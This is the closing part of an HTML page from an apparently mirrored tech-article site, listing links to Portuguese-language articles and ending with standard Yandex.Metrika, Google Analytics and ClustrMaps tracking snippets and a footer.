<li><a href="../pt405085/index.html">Revis√£o de v√≠deo na c√¢mera Clevermic UNO PTZ</a></li>
<li><a href="../pt405087/index.html">Como conectar vigil√¢ncia por v√≠deo usando amplifica√ß√£o de sinal 2G / 3G / 4G</a></li>
<li><a href="../pt405089/index.html">Como funciona o servi√ßo Dog Walking?</a></li>
<li><a href="../pt405091/index.html">NASA atingir√° um aster√≥ide em outubro de 2022 para testar a defesa planet√°ria</a></li>
<li><a href="../pt405093/index.html">Por que a part√≠cula de Higgs √© t√£o importante</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>